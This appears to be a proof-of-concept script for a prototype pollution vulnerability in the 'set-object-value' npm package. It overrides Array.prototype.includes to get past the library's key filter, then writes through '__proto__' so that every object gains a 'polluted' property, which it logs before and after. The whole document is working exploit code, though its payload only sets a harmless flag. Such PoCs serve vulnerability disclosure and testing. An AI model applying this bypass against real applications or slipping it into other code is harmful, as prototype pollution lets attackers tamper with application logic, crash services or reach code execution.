Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
var setObjectValue = require('set-object-value');
obj = {};
console.log({}.polluted);
setObjectValue(obj, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);